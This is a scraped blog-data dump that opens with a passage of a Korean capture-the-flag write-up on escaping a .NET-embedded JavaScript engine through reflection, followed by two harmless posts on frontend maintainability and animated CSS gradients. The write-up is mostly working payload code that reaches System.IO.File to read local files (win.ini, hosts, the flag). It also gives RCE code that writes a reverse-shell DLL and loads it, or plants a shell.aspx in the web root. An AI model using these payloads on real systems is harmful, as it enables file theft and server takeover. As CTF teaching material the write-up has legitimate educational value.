중에 공개 메서드를 실행할 수 있습니다. 그렇다면 ProcessChat_Helper 객체에 어떤 메서드가 있는지 살펴보겠습니다. 다음 코드로 확인할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var methods = [];\n        var processChatHelper = this[\"ProcessChat_Helper\"];\n        if (processChatHelper !== undefined) {\n            methods.push(\"Methods: \" + Object.getOwnPropertyNames(processChatHelper).join(\", \"));\n        }\n        return \"\" + methods.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_10.png)\n\n해당 객체에는 7가지 메서드가 있고, 이를 호출할 수 있습니다. 예를 들어, GetHashCode() 메서드를 호출하려면 this.ProcessChat_helper.GetHashCode()를 사용하여 클래스 이름을 문자열로 가져올 수 있습니다.\n\n```js\nthis.ProcessChat_Helper.GetHashCode()\n```\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_11.png)\n\n\n<div class=\"content-ad\"></div>\n\n## 타입 및 메서드\n\nGetAvailableLanguages() 메서드를 호출하려고 시도했더니 다음과 같은 결과가 나왔어요:\n\n```js\nthis.ProcessChat_Helper.GetAvailableLanguages()\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_12.png\" />\n\n<div class=\"content-ad\"></div>\n\n우리가 돌아온 반환 유형은 실제 데이터가 아니라 문자열 배열이며, Reflection이 활성화되어 있기 때문에 해당 유형의 메서드를 호출할 수 있습니다. 예를 들어, 함수에서 반환된 배열의 길이를 얻고 싶다면 GetLength(0) 메서드를 호출하여 각 색인의 값 가져오려면 GetValue(index)를 사용합니다:\n\n```js\n// 여기서 Zero는 배열의 차원을 나타내며, 우리 경우 1차원 배열\nvar len = this.ProcessChat_Helper.GetAvailableLanguages().GetLength(0); // 2\nvar elements = [];\nfor(let i = 0; i < len; i++) {\n  elements.push(this.ProcessChat_Helper.GetAvailableLanguages().GetValue(i));\n}\nelements.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_13.png\" />\n\n지금까지는 ProcessChatHelper 클래스의 메서드를 호출할 수 있었지만, 더 다룰 클래스인 System.String[]이 있고, 이 코드를 사용하여 해당 클래스의 함수를 나열할 수 있습니다. GetMethods() 함수는 클래스의 모든 메서드 배열을 반환하므로 이를 활용할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar methodsArray = this.ProcessChat_Helper.GetAvailableLanguages().GetType().GetMethods(); \nvar len = methodsArray.GetLength(0);\nvar methods = [];\nfor( let i = 0; i < len; i++) {\n   var typeName = methodsArray.GetValue(i).ToString();\n   methods.push(typeName);\n};\nmethods.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_14.png\" />\n\n이제 우리는 현재 형식이 직접 상속받는 형식, 즉 부모 클래스의 형식을 가져오는 유형의 속성인 BaseClass를 가져올 수도 있습니다. 이 작업을 System.String[] 유형으로 수행하면 System.Object를 얻게 되는데, 이는 다음 섹션에서 매우 유용하게 사용될 것입니다.\n\n```js\nthis.ProcessChat_Helper.GetType().BaseType\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_15.png\" />\n\n## 어셈블리\n\n지금까지 우리는 System.Object, System.String[]을 가지고 있으며 그 중 어느 것도 플래그 파일을 읽을 수 있는 메소드가 없습니다. 이제 어셈블리 속성이 등장합니다. C# 문서에 따르면 타입의 어셈블리 속성은 어셈블리 인스턴스를 반환하며, 이것은 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 개체로 생각할 수 있습니다.\n\n다시 말해, 우리가 System.Object 타입을 가지고 있고 이것의 어셈블리 속성에 액세스했다면, 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 어셈블리가 있습니다. 이는 우리에게 유용합니다. 왜냐하면 로컬 파일을 읽을 수 있는 다른 타입에 액세스하고 싶기 때문에, 우리는 System.IO.File 타입의 ReadAllText 메소드에 액세스함으로써 이를 수행할 수 있습니다. 다음 코드는 어셈블리 내의 모든 타입을 출력합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); // Array length = 2594 :\"D \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   types.push(typesArray.GetValue(i).ToString());\n};\ntypes.join(\", \")\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_16.png\" />\n\n어셈블리에 있는 모든 타입들입니다. 2594개의 타입이 있습니다.\n\n## 로컬 파일 노출\n\n\n<div class=\"content-ad\"></div>\n\n이제 우리는 System.IO.File 유형이 필요하다는 것을 알았으므로, 해당 유형의 배열에서 인덱스를 가져와 직접 액세스할 수 있어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0);\nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.IO.File\"){\n      var index = i;\n      break;\n   }\n};\ntypesArray.GetValue(index).ToString() + \"Type found at index: \" + index\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_17.png\" />\n\n이제 동일한 방식으로 System.IO.File 유형에서 ReadAllText 메서드를 가져오겠습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar len = fileTypeMethods.GetLength(0);\nvar methods = {};\nfor( let i = 0; i < len; i++) {\n   var methodName = fileTypeMethods.GetValue(i).ToString();\n   if(methodName.includes(\"ReadAllText\")){\n      var index = i;\n      methods[i] = methodName;\n   }\n};\nJSON.stringify(methods)\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_18.png\" />\n\n필요한 함수는 인덱스 49에 있으므로, 해당 경로로 호출해 보겠습니다. 메서드에 Invoke를 사용할 것입니다. 문서에서 원하는 Invoke 메서드는 2개의 매개변수를 취하며, 둘 다 객체여야 합니다. 첫 번째 매개변수는 해당 메서드를 호출하려는 클래스의 인스턴스여야 하며, 두 번째 매개변수는 메서드에 전달할 인수를 포함하는 배열이어야 합니다. ReadAllText는 정적 메서드이므로 첫 번째 인수는 null이어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\narg = [\"c:\\\\windows\\\\win.ini\"];\nfileTypeMethods.GetValue(49).Invoke(null, arg)\n```\n\n<div class=\"content-ad\"></div>\n\n\n![2024-06-30-ExploitingaJavaScriptEngineforNET_19](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_19.png)\n\n에러가 발생했습니다! 이 에러의 원인은 Invoke 함수가 JavaScript 객체가 아닌 .Net 객체를 매개변수로 취한다는 것입니다. 따라서 함수에 경로가 될 .Net 객체나 .Net 문자열 배열이 필요합니다.\n\n그래서 열거로 돌아가서, 인스턴스를 가지고 있지 않기 때문에 null이어야 하는 정적 함수를 호출해야 하며, 매개변수를 가져서 하나의 요소로 이루어진 문자열 배열을 반환해야 합니다.\n\n몇 가지 열거를 통해 System.Environment 클래스의 GetCommandLineArgs 함수가 이 작업을 수행한다는 것을 찾아냈습니다. 그러니 호출하여 문자열 배열을 가져오겠습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.Environment\"){\n      var typeIndex = i;\n      break;\n   }\n};\nvar envType = typesArray.GetValue(typeIndex); // typeIndex = 128 \nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null).GetValue(0); \noneElemArr\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_20.png\" />\n\n이 배열을 사용하여 SetValue(Value, index)로 요소를 원하는 파일 경로로 설정하고 invoke 함수에 전달하면 Local File Disclosure을 얻을 수 있습니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileReadMethods = typesArray.GetValue(2008).GetMethods();\nvar envType = typesArray.GetValue(128);\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \noneElemArr.SetValue(\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\", 0);\nfileReadMethods.GetValue(49).Invoke(null, oneElemArr)\n```\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_21.png\" />\n\n## 플래그 읽기\n\n이제 도전 과제의 마지막 조각인데요, c:\\temp 디렉터리에 있는 플래그 파일을 읽어야 합니다. 하지만 우리는 플래그의 이름을 모르기 때문에 flag.txt가 아니라고 확신하고 있어요. 제가 시도해 봤기 때문이죠. 따라서 temp 디렉터리에있는 파일을 나열한 다음에 readfile 메서드를 사용하여 읽어야 합니다.\n\n디렉터리에 있는 파일을 나열하기 위해서, System.IO.Directory 유형의 GetFiles(String path) 메서드가 이를 처리할거에요. 그러니 이를 사용해 봅시다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\r\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\r\nvar typesArray = objectClass.Assembly.GetTypes();\r\nvar len = typesArray.GetLength(0); \r\nvar types = [];\r\nfor( let i = 0; i < len; i++) {\r\n   var typeName = typesArray.GetValue(i).ToString();\r\n   if(typeName == \"System.IO.Directory\"){\r\n      var typeIndex = i;\r\n      break;\r\n   }\r\n};\r\nvar dirTypeMethods = typesArray.GetValue(typeIndex).GetMethods();\r\nvar len = dirTypeMethods.GetLength(0);\r\nvar methods = {};\r\nfor( let i = 0; i < len; i++) {\r\n   var methodName = dirTypeMethods.GetValue(i).ToString();\r\n   if(methodName.includes(\"GetFiles\")){\r\n      var index = i;\r\n      methods[i] = methodName;\r\n   }\r\n};\r\nvar getFilesMethod = dirTypeMethods.GetValue(17); // GetFile(String) at index 17\r\nvar envType = typesArray.GetValue(128);\r\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \r\noneElemArr.SetValue(\"C:\\\\Temp\", 0);\r\n// Getting all the filenames in the c:\\\\temp\r\ntempFilesArr = getFilesMethod.Invoke(null, oneElemArr);\r\nvar len = tempFilesArr.GetLength(0);\r\nvar fileReadMethod = typesArray.GetValue(2008).GetMethods().GetValue(49);\r\nfor( let i = 0; i < len; i++) {\r\n   var fileName = tempFilesArr.GetValue(i);\r\n   oneElemArr.SetValue(fileName, 0);\r\n   // the Flag filename contais Flag and some other random values\r\n   if(fileName.includes(\"Flag\")) {\r\n     // read the flag file\r\n     var fileContent = fileReadMethod.Invoke(null, oneElemArr);\r\n     break;\r\n   }\r\n};\r\nfileContent\r\n```\r\n\r\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_22.png)\r\n\r\n## 원격 코드 실행\r\n\r\nRCE에 대해서는 원격에서 작동하지 않아 작동 원인을 알 수 없었지만 로컬에서는 작동했으므로 다른 누군가에게 도움이 될지도 모르니 코드를 공유하겠습니다.\r\n\n\n<div class=\"content-ad\"></div>\n\nRCE의 아이디어는 System.IO.File 클래스의 WriteAllText(String content, String path)를 사용하여 서버에 악성 .dll 파일을 작성하고, System.Reflection.Assembly 클래스의 LoadFile(String path) 함수를 사용하여 해당 파일을 로드하는 것입니다. 여기서 역쉘 dll 파일의 코드를 찾을 수 있습니다. 이를 컴파일한 후 hex로 인코딩하고 바이트를 \\x69 형식으로 작성하여 코드 내에서 해당 부분을 대체하십시오.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\temp\\\\z4ki.dll\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 편집하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\nvar assemblyType = objectClass.Assembly.GetType().BaseType\nvar oneElemArr = objectClass.Assembly.GetTypes().GetValue(128).GetMethod(\"GetCommandLineArgs\").Invoke(null,null);\noneElemArr.SetValue(\"C:\\\\Temp\\\\z4ki.dll\",0);\nassemblyType.GetMethod(\"LoadFile\").Invoke(null,oneElemArr);\n```\n\n## 또 다른 RCE 방법\n\n다른 방법으로는, 서버의 웹 루트에 shell.aspx 파일을 작성하여 라이브러리에서 원격 코드 실행을 얻을 수 있습니다. 그러나 불행하게도 웹 루트에 쓰기 권한이 없었지만 참고를 위해 코드를 여기에 남깁니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\ChatBot\\\\wwwroot\\\\shell.aspx\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 수정하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\n```\n\n이제 http://`ip`/shell.aspx 로 이동하면 쉘을 찾을 수 있습니다.\n\n여기까지 오신 당신에게 경의를 표하며 읽기를 즐겼고 새로운 것을 배웠기를 바랍니다. 궁금한 점이 있으면 LinkedIn에서 연락해 주세요.\n","ogImage":{"url":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png"},"coverImage":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png","tag":["Tech"],"readingTime":15},{"title":"2년 후에도 고통스럽지 않은 프론트엔드 프로젝트 시작하는 방법","description":"","date":"2024-06-27 18:26","slug":"2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years","content":"\n\n새 프로젝트를 시작하면 항상 세상에서 가장 기분 좋은 순간 중 하나입니다. 새로운 시작에는 신선함과 훌륭한 아이디어가 넘쳐납니다. 이번에는 회사에 여러 해 동안 도움이 되는 깨끗하고 유지보수가 용이하며 확장 가능한 프로젝트가 될 것이라고 자신과 팀원들에게 이야기합니다.\n\n하지만 일이 벌어지면! 기능을 계속해서 추가하다 보면 처음에는 그렇게 나쁘지 않다고 생각할 수 있습니다. 그러나 시간이 흐른 뒤에 이 프로젝트가 과거 프로젝트에서 싫어하던 모든 것으로 변해버렸다는 것을 깨닫게 됩니다!\n\n이런 일이 발생하지 않도록 프로젝트의 위험을 최소화하는 방법이 있습니다. 제가 몇 가지 예시를 vue를 사용해서 만들어보았습니다(내 경험이 더 풍부하기 때문에), 하지만 모든 종류의 프론트엔드 프로젝트에 적용됩니다:\n\n# 더 적은 라이브러리는 프로젝트의 장수와 단순함을 의미합니다\n\n<div class=\"content-ad\"></div>\n\n프로젝트의 스택과 라이브러리를 선택할 때 조심해야 해요. 각 라이브러리는 일정 시간을 절약할 수 있는 기능을 가지고 있을 수 있지만 프로젝트에 복잡성을 추가할 수도 있어요. 게다가 그 라이브러리에 의존하게 되면 유지보수되지 않는다면 문제가 생길 수 있어요.\n\n특히 프로젝트 구문 전반에 영향을 주는 라이브러리와 도구들인 Tailwind CSS, SCSS, CSS-in-JS 라이브러리, 그리고 TypeScript은 특히 중요해요.\n\n이러한 라이브러리 각각이 훌륭할 수 있지만, 팀에 따라 선택해야 하며 우리가 언급한 단점을 상쇄할 가치가 있는지 확인해야 해요. 특히 이제 HTML/CSS에 CSS 변수, calc 및 다른 새로운 HTML 기능과 기술이 추가되면서 더 많은 일을 할 수 있어요.\n\n두 가지 프로젝트를 상상해봐요:\n\n<div class=\"content-ad\"></div>\n\n- 프로젝트 원: Vue.js만 사용하여 일반 CSS와 HTML 템플릿을 사용합니다.\n- 프로젝트 투: Vue.js, SCSS, Tailwind CSS, 그리고 PrimeVue를 사용합니다.\n\n# 1년 후 유지보수 시나리오\n\n물론 사람들은 각양각색이고 어떤 사람들은 이러한 기술을 좋아할 수도 있고 내가 쓴 것과 다를 수 있지만, 내가 상상한 것은 다음과 같습니다:\n\n## 프로젝트 원:\n\n<div class=\"content-ad\"></div>\n\n새로운 팀원 온보딩:\n\n- 간단한 프로세스입니다.\n- HTML, CSS 및 기본 Vue.js 구문을 알고 있으면 충분합니다.\n- 주로 프로젝트 코드베이스 및 비즈니스 로직에 중점을 두고 있습니다.\n\n유지보수 및 업데이트:\n\n- 컴포넌트를 만드는 데 더 많은 시간이 필요할 수 있습니다.\n- 개발자들은 잘 알려진 컴포넌트 라이브러리를 참고하여 영감을 얻고 빠르게 컴포넌트를 만들 수 있습니다.\n- 1년 후에는 대부분의 기본 컴포넌트가 이미 구축되어 있습니다.\n- Vue.js를 업데이트할 때 의존성에 대해 크게 걱정할 필요가 없습니다.\n\n<div class=\"content-ad\"></div>\n\n## 두 번째 프로젝트:\n\n신규 팀원 온보딩:\n\n- 모든 템플릿에서 Tailwind CSS 구문을 사용하므로 신규 멤버는 이를 배워야 합니다.\n- PrimeVue 및 SCSS에 대한 지식 또한 필요합니다.\n- Tailwind CSS, PrimeVue 및 SCSS에 대한 문서를 검토하고 이해해야 합니다.\n\n유지 보수 및 업데이트:\n\n<div class=\"content-ad\"></div>\n\n- 새로운 Vue 버전(e.g., Vue 4)로 업데이트하려면 PrimeVue 컴포넌트와의 호환성을 확인해야 합니다.\n- 라이브러리(Tailwind CSS, PrimeVue, SCSS) 중 하나라도 사용 중지되면, 코드를 상당히 리팩토링하거나 다시 작성해야 할 수도 있습니다.\n\n프로젝트의 수명을 연장하는 데 중요한 것은 최소한의 종속성(특히 전체 프로젝트를 변경할 수 있는 종속성)을 가지고 있는 것을 알 수 있습니다.\n\n# 종속성 감싸기\n\n프론트엔드 개발자로서 모든 것을 처음부터 쓰는 것은 불가능합니다. 그러나 한 라이브러리와 영원히 결혼하길 원하지도 않습니다. 라이브러리의 API가 프로젝트와 일치하지 않을 수도 있습니다.\n\n<div class=\"content-ad\"></div>\n\n판단력이 중요하죠! 제가 도와드릴 수 있는 게 있으면 언제든 말해주세요!\n\n<div class=\"content-ad\"></div>\n\n# 프레임워크 가이드라인을 준수하고 만들어진 표준을 사용하세요\n\n사용 중인 프레임워크에는 가이드라인, 네이밍 규약 및 권장 구조가 있다면 정말 좋은 일입니다!\n\n왜냐하면 여러분은 바퀴를 다시 발명할 필요가 없을 뿐더러(아마도 최악의 바퀴), 모든 규칙을 문서화할 필요가 없고 프레임워크 문서에 링크만 걸어놓으면 됩니다.\n\n![2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png](/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png)\n\n<div class=\"content-ad\"></div>\n\n팀 내에서 자전거 건물 토론을 피하고 중요한 부분에 집중할 수 있어요.\n\nVue.js 스타일 가이드는 큰 프로젝트를 깔끔하게 유지하는 데 도움이 되는 많은 좋은 컨벤션들을 이미 갖고 있어 좋은 예시에요. 또한, Vue가 권장하는 폴더 구조와 함께 보일러플레이트를 생성하는 방식도 맘에 들어요.\n\n# SOLID 원칙 사용하기\n\n프런트엔드를 하다보면 다른 소프트웨어 엔지니어링 문화와는 별개로 따로 있는 것처럼 생각할 때가 있지만, 사실은 기계가 실행할 코드를 작성하고 있기 때문에 수년간의 소프트웨어 엔지니어링 경험을 활용하는 것이 프런트엔드에 유익하답니다.\n\n<div class=\"content-ad\"></div>\n\n여러 프론트엔드 프로젝트에서 SOLID를 사용하는 데 도움이 되는 좋은 기사들이 많이 있어요. 예를 들어,\n\n- React에 SOLID 적용하기\n- 미치지 않고 Vue.js 컴포넌트 라이브러리 만들기\n\n그리고 검색을 통해 더 많은 정보를 얻을 수 있어요.\n\n# 가이드라인 페이지가 있어요\n\n<div class=\"content-ad\"></div>\n\n프로젝트 기술 스택을 설명하는 다양한 하위 페이지가 포함된 가이드 라인 페이지가 있도록 해주세요. Vue 스타일 가이드와 같은 모든 관련 온라인 문서 및 가이드라인에 대한 링크가 포함되어야 합니다. 이 포괄적인 리소스는 기술 프레임워크와 모범 사례의 중심 허브로 작용할 것입니다.\n\n또한, 가이드라인은 철학을 상세히 설명하고 프로젝트가 확장 가능하고 유지 보수가 용이하도록하는 데 필요한 모든 정보를 제공해야 합니다. 이는 개발 프로세스 전반에 걸쳐 일관성과 품질을 유지하는 데 도움이 될 것입니다.\n\n기억하세요. 초기 선택 사항은 초기 개발뿐만 아니라 향후 확장성과 유지 보수의 용이성에도 영향을 줍니다.\n\n귀하의 프론트엔드 프로젝트를 유지 가능하고 확장 가능하게 유지하는 데 효과적인 전략은 무엇인가요? 아래 댓글에서 귀하의 생각과 경험을 들어보고 싶습니다.","ogImage":{"url":"/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png"},"coverImage":"/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png","tag":["Tech"],"readingTime":4},{"title":"움직이는 메쉬 그라데이션 배경으로 웹사이트에 생명을 불어넣는 방법","description":"","date":"2024-06-27 18:24","slug":"2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds","content":"\n\n요즘에는 메쉬 그라데이션 디자인이 점점 더 인기를 끌고 있는 것 같아요.\n\n이것이 저에게 궁금증을 일으켰는데, 만약 이 그라데이션을 애니메이션화해서 더 생동감 있게 만들 수 있을까요?\n\n![이미지](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png)\n\n본문에서는 움직이는 메쉬 그라디언트 배경을 애니메이션화하여 웹사이트에 다이내미즘과 생동감을 더해주는 방법을 배워보겠어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*PL_QXqTv_ibiPlDv9Ux1NQ.gif\" />\n\n# 준비물\n\n시작하기 전에 다음 사항을 준비해주세요:\n\n- React 프로젝트가 설정되어 있어야 합니다.\n- Tailwind 종속성이 설치되어 있어야 합니다. npm install -D tailwindcss postcss autoprefixer && npx tailwindcss init -p\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_1.png)\n\n# Mesh Gradient 배경 구현하기\n\n## 단계 1: Mesh Gradient Generator 찾기\n\n먼저, 우리는 애니메이션할 수 있는 mesh gradient를 생성해야 합니다. 빠른 구글 검색으로 몇 가지 훌륭한 mesh gradient 생성기를 찾을 수 있습니다. 이 기사에서는 CSS 형식으로 mesh gradient를 출력할 수 있는 것이 필요합니다. https://csshero.org/mesher/ 이 사이트를 사용해보세요.\n\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_2.png\" />\n\n## 단계 2: 메시 그라디언트 CSS를 배경으로 추가하기\n\n생성기에서 CSS 코드를 복사하여 React 컴포넌트에 추가해보세요. 그러면 배경이 메시 그라디언트로 변경될 것입니다.\n\nMeshGradientBackground.jsx\n\n<div class=\"content-ad\"></div>\n\n```js\nimport React from 'react';\n\nfunction MeshGradientBackground(props) {\n    return (\n        <div style={ {position: 'relative', height: '100vh'} }>\n            {/* Background using ::before pseudo-element */}\n            <div style={\n                {\n                    position: 'absolute',\n                    top: 0,\n                    left: 0,\n                    width: '100%',\n                    height: '100%',\n                    zIndex: -1, // Ensure background is behind content\n                    backgroundColor: '#ff99df',\n                    backgroundImage: `\n                        radial-gradient(circle at 52% 73%, hsla(310, 85%, 67%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 0% 30%, hsla(197, 90%, 76%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 26%, hsla(234, 79%, 69%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 51%, hsla(41, 70%, 63%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 88%, hsla(36, 83%, 61%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 76% 73%, hsla(346, 69%, 70%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 29% 37%, hsla(272, 96%, 64%, 1) 0px, transparent 50%)`,\n                    backgroundSize: '100% 100%',\n                    filter: 'blur(80px)',\n                }\n            }></div>\n  \n        </div>\n    );\n}\n\nexport default MeshGradientBackground;\r\n```\n\n![Moving Mesh Gradient Background](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_3.png)\n\n## 단계 3: 메쉬 그라디언트 배경 애니메이션화\n\n메쉬 그라디언트를 애니메이션화하는 것은 그라디언트 색상을 직접적으로 애니메이션화하는 것이 지원되지 않기 때문에 까다로울 수 있습니다. 이 문제를 해결하기 위해 배경 크기를 애니메이션화하여 움직임의 환상을 만들 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n업데이트한 내용이 있는 MeshGradientBackground.jsx 파일을 수정해주세요.\n\n```js\nimport React from 'react';\nimport '../../styles.css'; // 이 파일에 @keyframes 정의가 포함되어 있는지 확인해주세요\n\nfunction MeshGradientBackground(props) {\n    return (\n        <div style={{ position: 'relative', height: '100vh' }}>\n            {/* ::before 가상 요소를 사용한 배경 */}\n            <div style={{\n                position: 'absolute',\n                top: 0,\n                left: 0,\n                width: '100%',\n                height: '100%',\n                zIndex: -1, // 배경이 내용 뒤에 있도록 함\n                backgroundColor: '#ff99df',\n                backgroundImage: `\n                    radial-gradient(circle at 52% 73%, hsla(310, 85%, 67%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 0% 30%, hsla(197, 90%, 76%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 26%, hsla(234, 79%, 69%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 51%, hsla(41, 70%, 63%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 88%, hsla(36, 83%, 61%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 76% 73%, hsla(346, 69%, 70%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 29% 37%, hsla(272, 96%, 64%, 1) 0px, transparent 50%)`,\n                backgroundSize: '150% 150%',\n                filter: 'blur(80px)',\n                animation: 'moveBackground 10s linear infinite',\n            }}></div>\n  \n        </div>\n    );\n}\n\nexport default MeshGradientBackground;\n```\n\nstyles.css 파일을 추가해주세요.\n\n```css\n@keyframes moveBackground {\n    0% { background-size: 100% 100%; }\n    10% { background-size: 120% 80%; }\n    20% { background-size: 190% 140%; }\n    30% { background-size: 130% 110%; }\n    40% { background-size: 150% 120%; }\n    50% { background-size: 180% 100%; }\n    60% { background-size: 220% 80%; }\n    70% { background-size: 100% 50%; }\n    80% { background-size: 120% 70%; }\n    90% { background-size: 110% 90%; }\n    100% { background-size: 100% 100%; }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Background Animation](https://miro.medium.com/v2/resize:fit:1400/1*GURQVNHCw-MtVgHjeS4GcQ.gif)\n\nThe background should move like this.\n\nExplanation:\n\nThe moveBackground animation is applied to this div, making the background size change over time, which gives the illusion of movement.\n\n\n<div class=\"content-ad\"></div>\n\n요렇게 하면 됩니다 — 메쉬 그라데이션 배경을 애니메이션화하는 간단한 키프레임 애니메이션이 완성되었어요.\n\n하지만 여기서 멈출 수 없었어요. 이 아름다운 배경의 매력을 전시하는 전체 랜딩 페이지로 만들고 싶었거든요. 그래서 Figma에서 디자인을 만들고 코드로 구현했어요.\n\n![GIF](https://miro.medium.com/v2/resize:fit:1400/1*PL_QXqTv_ibiPlDv9Ux1NQ.gif)\n\n전체 구성 요소를 다운로드하려면 제 GitHub를 확인해주세요!","ogImage":{"url":"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png"},"coverImage":"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png","tag":["Tech"],"readingTime":6}],"page":"1","totalPageCount":154,"totalPageGroupCount":8,"lastPageGroup":20,"currentPageGroup":0},"__N_SSG":true}